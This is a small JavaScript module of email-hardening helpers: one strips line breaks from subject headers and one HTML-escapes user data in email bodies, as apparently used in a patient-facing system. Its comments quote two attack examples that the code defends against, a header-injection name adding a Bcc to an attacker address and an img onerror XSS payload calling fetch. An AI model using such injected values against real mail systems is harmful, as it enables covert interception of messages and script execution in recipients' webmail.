// Email injection hardening. Two functions used across the outbound email
// endpoints:
//
//   sanitizeSubject(str) — strips CR/LF from a value going into an email
//   Subject header. Blocks header-injection attacks where a patient name
//   like "John\r\nBcc: attacker@evil.com" would otherwise silently add
//   a BCC to every outbound.
//
//   escapeHtml(str) — HTML-escapes user data going into an email HTML
//   body so a patient name of "<img src=x onerror=fetch('...')>" renders
//   as literal text instead of executing in the recipient's webmail.

export function sanitizeSubject(s) {
  return String(s ?? '').replace(/[\r\n]+/g, ' ').replace(/\s{2,}/g, ' ').trim()
}

export function escapeHtml(s) {
  return String(s ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}
